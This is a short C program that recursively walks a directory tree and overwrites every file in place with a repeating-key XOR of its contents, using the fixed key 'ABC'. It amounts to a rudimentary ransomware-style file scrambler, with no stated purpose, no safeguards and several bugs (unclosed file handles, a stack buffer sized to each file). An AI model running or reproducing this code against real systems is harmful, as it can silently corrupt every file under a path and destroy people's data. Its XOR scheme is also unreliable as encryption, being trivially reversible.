#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <ftw.h>
#include <sys/stat.h>
#include <string.h>

struct filez {
	uint8_t *buffer;
	uint64_t size;
};
typedef struct filez Filez;

//Function prototypes
Filez readfile(const uint8_t *);
void writefile(const uint8_t *, uint8_t *, uint64_t);
void encryptDecrypt(uint8_t *, uint8_t *, uint64_t);
int list(const char *name, const struct stat *status, int type);
void encryptFile(const char *);

int main(int argc, uint8_t *argv[]) {
	// get starting path
	if (argc != 2) {
		printf("Usage %s <starting path>\n", argv[0]);
		return 1;
	}

	// start encryption
	ftw(argv[1], list, 1);

	return 0;
}

void encryptFile(const char* array) {
	// read file into buffer
	Filez file = readfile(array);
	
	// encrypt file
	uint8_t encrypted[file.size];
	encryptDecrypt(file.buffer, encrypted, file.size);

	// write out to disk
	writefile(array, encrypted, file.size);

	free(file.buffer);
}

int list(const char *name, const struct stat *status, int type) {
	if(type == FTW_NS)
		return 0;

	if(type == FTW_F) {
		encryptFile(name);
	}

	return 0;
}

void encryptDecrypt(uint8_t *input, uint8_t *output, uint64_t size) {
	uint8_t key[] = {'A', 'B', 'C'}; //Can be any chars, and any size array
	
	for(int i = 0; i < size; i++) {
		output[i] = input[i] ^ key[i % (sizeof(key)/sizeof(uint8_t))];
	}
}

void writefile(const uint8_t *name, uint8_t *content, uint64_t size) {
	FILE *fp = fopen(name, "wb");
	fwrite(content, 1, size, fp);
}

Filez readfile(const uint8_t *name) {
	Filez file;
	// get file pointer
	FILE *fp = fopen(name, "rb");

	// get file size
	fseek(fp, 0, SEEK_END);
	file.size = ftell(fp);
	rewind(fp);

	// initalize buffer with file size
	file.buffer = (uint8_t *)malloc((file.size+1)*sizeof(uint8_t));

	// read all characters into buffer
	fread(file.buffer, 1, file.size, fp);

	// close file
	fclose(fp);

	return file;
}
